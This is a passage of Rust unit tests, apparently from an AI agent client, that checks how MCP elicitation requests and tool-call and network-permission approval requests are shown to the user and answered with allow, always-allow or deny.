        let reply = crate::acp::elicitation_reply(&fields, &answers);
        assert_eq!(reply, json!({"action": "accept", "content": {"repo": "app", "notify": true}}));

        let url = json!({"method": "mcpServer/elicitation/request", "id": 12, "params": {
            "serverName": "linear", "mode": "url", "message": "Authorize Linear:", "url": "https://linear.app/oauth"
        }});
        let (ev, _) = run(&[url]);
        let expected = "linear: Authorize Linear: https://linear.app/oauth";
        assert!(matches!(&ev[0], ChatEvent::Notice { level: NoticeLevel::Info, text } if text == expected));

        let confirm = json!({"method": "mcpServer/elicitation/request", "id": 13, "params": {
            "serverName": "postgres", "mode": "form", "message": "Allow read-only query?"
        }});
        let (ev, state) = run(&[confirm]);
        match &ev[0] {
            ChatEvent::Approval { request } => {
                assert_eq!(request.request_id, "cx-13");
                assert_eq!(request.kind, ApprovalKind::Other);
                assert_eq!(request.title, "Approve postgres request");
                assert_eq!(request.detail.as_deref(), Some("Allow read-only query?"));
                assert!(!request.can_remember);
            }
            e => panic!("{e:?}"),
        }
        let pending = state.lock().unwrap().pending_approvals.remove("cx-13").unwrap().kind;
        assert_eq!(approval_reply(&pending, Decision::Allow), json!({"action": "accept", "content": {}}));
        assert_eq!(approval_reply(&pending, Decision::Deny), json!({"action": "decline"}));
    }

    #[test]
    fn handles_mcp_and_permissions_approvals() {
        let (ev, state) = run(&[
            json!({"method": "item/started", "params": {"item": {"type": "mcpToolCall", "id": "m1", "server": "github", "tool": "create_issue", "arguments": {"repo": "moonfish", "title": "Fix bug"}}}}),
            json!({"method": "item/mcpToolCall/requestApproval", "id": 21, "params": {"itemId": "m1", "reason": "Write access requested"}}),
            json!({"method": "item/mcpToolCall/requestApproval", "id": 22, "params": {"server": "slack", "tool": "post_message", "arguments": {"channel": "#dev", "text": "shipped"}}}),
            json!({"method": "item/permissions/requestApproval", "id": 23, "params": {"itemId": "p1", "reason": "Need network access", "permissions": {"network": {"enabled": true}}}}),
        ]);
        match &ev[1] {
            ChatEvent::Approval { request } => {
                assert_eq!(request.request_id, "cx-21");
                assert_eq!(request.kind, ApprovalKind::Other);
                assert_eq!(request.title, "Use github · create_issue");
                assert_eq!(request.detail.as_deref(), Some("Write access requested\nrepo: moonfish\ntitle: Fix bug"));
                assert!(request.can_remember);
            }
            e => panic!("{e:?}"),
        }
        match &ev[2] {
            ChatEvent::Approval { request } => {
                assert_eq!(request.request_id, "cx-22");
                assert_eq!(request.title, "Use slack · post_message");
                assert_eq!(request.detail.as_deref(), Some("channel: #dev\ntext: shipped"));
            }
            e => panic!("{e:?}"),
        }
        match &ev[3] {
            ChatEvent::Approval { request } => {
                assert_eq!(request.request_id, "cx-23");
                assert_eq!(request.kind, ApprovalKind::Other);
                assert_eq!(request.title, "Grant permissions");
                assert!(request.detail.as_deref().unwrap().contains("Need network access"));
                assert!(request.detail.as_deref().unwrap().contains("network:"));
            }
            e => panic!("{e:?}"),
        }
        let mut st = state.lock().unwrap();
        let mcp_pending = st.pending_approvals.remove("cx-21").unwrap().kind;
        assert_eq!(approval_reply(&mcp_pending, Decision::Allow), json!({"decision": "accept"}));
        assert_eq!(approval_reply(&mcp_pending, Decision::AllowAlways), json!({"decision": "acceptForSession"}));
        assert_eq!(approval_reply(&mcp_pending, Decision::Deny), json!({"decision": "decline"}));
        let perm_pending = st.pending_approvals.remove("cx-23").unwrap().kind;
        assert_eq!(approval_reply(&perm_pending, Decision::Allow), json!({"permissions": {"network": {"enabled": true}}, "scope": "turn"}));
        assert_eq!(
            approval_reply(&perm_pending, Decision::AllowAlways),
            json!({"permissions": {"network": {"enabled": true}}, "scope": "session"})
        );
        assert_eq!(approval_reply(&perm_pending, Decision::Deny), json!({"permissions": {}, "scope": "turn"}));
    }
}
